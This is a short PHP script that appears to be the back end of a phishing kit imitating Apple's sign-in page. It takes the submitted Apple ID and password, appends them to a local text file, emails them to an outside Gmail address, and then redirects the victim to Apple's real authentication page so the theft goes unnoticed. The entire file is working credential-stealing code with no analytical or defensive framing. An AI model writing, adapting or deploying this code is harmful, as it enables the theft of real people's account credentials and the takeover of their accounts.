<?php

$id=$_REQUEST['appleId'];
$pass=$_REQUEST['accountPassword'];

$monfichier = fopen('spam.txt','a+');
fputs($monfichier, $id.'--'.$pass."\r\n"); 
fclose($monfichier);



$mail="bouha51@gmail.com";
mail($mail,"APPLE","login et password apple :: ".$id."  ||   ".$pass);
print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/authenticate?appIdKey=45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623&appleId=".$_REQUEST['appleId']."&accountPassword=".$_REQUEST['accountPassword']."\")' ,0);</script>");

?>



